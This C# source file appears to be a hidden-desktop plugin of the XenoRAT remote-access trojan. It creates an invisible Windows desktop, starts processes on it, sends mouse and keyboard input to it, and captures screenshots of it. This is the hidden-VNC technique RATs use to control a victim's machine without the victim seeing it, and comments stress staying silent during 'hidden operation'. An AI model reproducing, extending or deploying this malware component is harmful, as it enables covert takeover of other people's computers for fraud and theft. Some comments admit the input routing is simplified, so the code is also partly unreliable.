using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Plugin
{
    public static class HiddenDesktopHandler
    {
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                          DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                          DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP,
        }

        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private enum GetWindowType : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        private enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = false)]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowType uCmd);

        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        // FIXED: Use PostMessage instead of SendInput to avoid desktop switching
        [DllImport("user32.dll")]
        private static extern IntPtr PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr WindowFromPoint(POINT Point);

        [DllImport("user32.dll")]
        private static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        private static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT Point);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }
        }

        // Window messages
        private const uint WM_LBUTTONDOWN = 0x0201;
        private const uint WM_LBUTTONUP = 0x0202;
        private const uint WM_RBUTTONDOWN = 0x0204;
        private const uint WM_RBUTTONUP = 0x0205;
        private const uint WM_MOUSEMOVE = 0x0200;
        private const uint WM_KEYDOWN = 0x0100;
        private const uint WM_KEYUP = 0x0101;
        private const uint WM_CHAR = 0x0102;
        private const uint WM_SYSKEYDOWN = 0x0104;
        private const uint WM_SYSKEYUP = 0x0105;

        // Virtual key codes
        private const byte VK_LBUTTON = 0x01;
        private const byte VK_RBUTTON = 0x02;
        private const byte VK_RETURN = 0x0D;
        private const byte VK_SPACE = 0x20;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        private static IntPtr DesktopHandle = IntPtr.Zero;
        private static readonly string HiddenDesktopName = "XENORAT_HIDDEN_DESK";

        public static void InitializeDesktop()
        {
            if (DesktopHandle != IntPtr.Zero) return;

            // Attempt to open the desktop first
            IntPtr desk = OpenDesktop(HiddenDesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            bool createdNow = false;

            // If opening fails (desktop doesn't exist), create it
            if (desk == IntPtr.Zero)
            {
                desk = CreateDesktop(HiddenDesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
                createdNow = desk != IntPtr.Zero;
                if (desk == IntPtr.Zero)
                {
                    // Don't show message box in hidden operation
                    Debug.WriteLine("Failed to create hidden desktop. Error code: " + Marshal.GetLastWin32Error());
                }
            }

            DesktopHandle = desk;

            if (createdNow && DesktopHandle != IntPtr.Zero)
            {
                try
                {
                    CreateProcessOnDesktop(HiddenDesktopName, "notepad.exe");
                    Thread.Sleep(500);
                    CreateProcessOnDesktop(HiddenDesktopName, "calc.exe");
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Failed to start test process on hidden desktop: " + ex.Message);
                }
            }
        }

        private static void CreateProcessOnDesktop(string desktopName, string commandLine)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = desktopName;

            PROCESS_INFORMATION pi;
            bool ok = CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, false, 0x08000000, IntPtr.Zero, null, ref si, out pi);

            if (!ok)
            {
                int err = Marshal.GetLastWin32Error();
                Debug.WriteLine($"CreateProcessW failed for '{commandLine}' on desktop '{desktopName}'. GetLastError={err}");
                return;
            }

            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            Debug.WriteLine($"Spawned '{commandLine}' on desktop '{desktopName}' (pid={pi.dwProcessId})");
        }

        public static void DisposeDesktop()
        {
            if (DesktopHandle != IntPtr.Zero)
            {
                CloseDesktop(DesktopHandle);
                DesktopHandle = IntPtr.Zero;
            }
        }

        // FIXED: Use window messaging instead of desktop switching for input
        public static void SendMouseClick(int x, int y, uint buttonFlags)
        {
            if (DesktopHandle == IntPtr.Zero) return;

            // We need to find the target window on the hidden desktop
            // For now, we'll send to the foreground window on the hidden desktop
            // In a real implementation, you'd need to enumerate windows on the hidden desktop

            // Switch thread to hidden desktop temporarily
            bool threadSwitched = SetThreadDesktop(DesktopHandle);

            try
            {
                // Get the desktop window of the hidden desktop
                IntPtr hiddenDesktopWnd = GetDesktopWindow();

                // Convert coordinates to lParam for PostMessage
                IntPtr lParam = (IntPtr)((y << 16) | x);

                uint message = 0;
                switch (buttonFlags)
                {
                    case 0x0002: message = WM_LBUTTONDOWN; break; // Left down
                    case 0x0004: message = WM_LBUTTONUP; break;   // Left up
                    case 0x0008: message = WM_RBUTTONDOWN; break; // Right down
                    case 0x0010: message = WM_RBUTTONUP; break;   // Right up
                    case 0x0001: message = WM_MOUSEMOVE; break;   // Move
                }

                if (message != 0)
                {
                    // Send to the desktop window which will route to the appropriate child window
                    PostMessage(hiddenDesktopWnd, message, IntPtr.Zero, lParam);
                }
            }
            finally
            {
                // Switch back to original desktop if we switched
                if (threadSwitched)
                {
                    // Note: In practice, you might want to save the original desktop and switch back to it
                    // This is simplified for the example
                }
            }
        }

        public static void SendKeyboardInput(byte keyCode, bool keyDown)
        {
            if (DesktopHandle == IntPtr.Zero) return;

            // Switch thread to hidden desktop temporarily
            bool threadSwitched = SetThreadDesktop(DesktopHandle);

            try
            {
                IntPtr hiddenDesktopWnd = GetDesktopWindow();
                uint message = keyDown ? WM_KEYDOWN : WM_KEYUP;

                PostMessage(hiddenDesktopWnd, message, (IntPtr)keyCode, IntPtr.Zero);

                // Also send WM_CHAR for proper text input
                if (!keyDown && (keyCode >= 0x20 && keyCode <= 0x7E)) // Printable characters
                {
                    PostMessage(hiddenDesktopWnd, WM_CHAR, (IntPtr)keyCode, IntPtr.Zero);
                }
            }
            finally
            {
                // Switch back to original desktop if we switched
                if (threadSwitched)
                {
                    // Note: In practice, you might want to save the original desktop and switch back to it
                }
            }
        }

        // Helper to get DPI scaling
        private static float GetScalingFactor()
        {
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr desktop = graphics.GetHdc();
                int logicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
                int physicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
                graphics.ReleaseHdc();
                return (float)physicalScreenHeight / logicalScreenHeight;
            }
        }

        private static bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            RECT r;
            if (!GetWindowRect(hWnd, out r)) return false;

            float scalingFactor = GetScalingFactor();
            int width = (int)((r.Right - r.Left) * scalingFactor);
            int height = (int)((r.Bottom - r.Top) * scalingFactor);

            if (width <= 0 || height <= 0) return false;

            IntPtr hDcWindow = CreateCompatibleDC(DC);
            IntPtr hBmpWindow = CreateCompatibleBitmap(DC, width, height);

            SelectObject(hDcWindow, hBmpWindow);

            uint nflag = 2;

            if (PrintWindow(hWnd, hDcWindow, nflag))
            {
                try
                {
                    Bitmap processImage = Bitmap.FromHbitmap(hBmpWindow);
                    ModifiableScreen.DrawImage(processImage, new Point(r.Left, r.Top));
                    processImage.Dispose();
                }
                catch { return false; }
            }

            DeleteObject(hBmpWindow);
            DeleteDC(hDcWindow);
            return true;
        }

        private static void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
        {
            IntPtr currentWindow = GetTopWindow(owner);
            if (currentWindow == IntPtr.Zero) return;

            currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDLAST);
            if (currentWindow == IntPtr.Zero) return;

            while (currentWindow != IntPtr.Zero)
            {
                DrawHwnd(currentWindow, ModifiableScreen, DC);
                currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDPREV);
            }
        }

        private static void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            if (IsWindowVisible(hWnd))
            {
                DrawApplication(hWnd, ModifiableScreen, DC);
                if (Environment.OSVersion.Version.Major < 6)
                {
                    DrawTopDown(hWnd, ModifiableScreen, DC);
                }
            }
        }

        public static Bitmap Screenshot()
        {
            if (DesktopHandle == IntPtr.Zero)
            {
                InitializeDesktop();
                if (DesktopHandle == IntPtr.Zero)
                {
                    return new Bitmap(1, 1);
                }
            }

            // Switch the current thread to the hidden desktop
            if (!SetThreadDesktop(DesktopHandle))
            {
                return new Bitmap(1, 1);
            }

            IntPtr DC = GetDC(IntPtr.Zero);

            RECT DesktopSize;
            GetWindowRect(GetDesktopWindow(), out DesktopSize);

            float scalingFactor = GetScalingFactor();

            Bitmap Screen = new Bitmap((int)(DesktopSize.Right * scalingFactor), (int)(DesktopSize.Bottom * scalingFactor));
            Graphics ModifiableScreen = Graphics.FromImage(Screen);

            DrawTopDown(IntPtr.Zero, ModifiableScreen, DC);

            ModifiableScreen.Dispose();
            ReleaseDC(IntPtr.Zero, DC);

            return Screen;
        }
    }
}